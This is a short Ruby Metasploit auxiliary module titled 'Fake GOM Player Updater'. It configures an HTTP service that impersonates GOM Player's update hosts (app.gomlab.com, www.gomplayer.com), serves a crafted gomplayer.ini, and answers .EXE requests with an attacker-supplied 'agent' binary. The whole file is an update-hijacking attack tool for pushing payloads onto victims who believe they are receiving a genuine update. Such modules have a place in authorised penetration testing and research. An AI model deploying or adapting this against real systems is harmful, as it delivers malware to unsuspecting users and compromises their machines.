require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake GOM Player Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake GOM Player updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		@base = {	
			'vh' => ['app.gomlab.com' , 'www.gomplayer.com'],
			'request' => [{
				'req' => '.ini', 
				'type' => 'file', 
				'bin'    => 0,
				'string' => '',
				'parse' => 0,
				'file' => 'gomplayer.ini',
			},
			{
				'req' => '.EXE', 
				'type' => 'agent', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			}
			],
			'options' => {  
				'version'  => { 
					'val' => '2196',
					'dynamic' => 0 
				},
			}
		}
	end
end
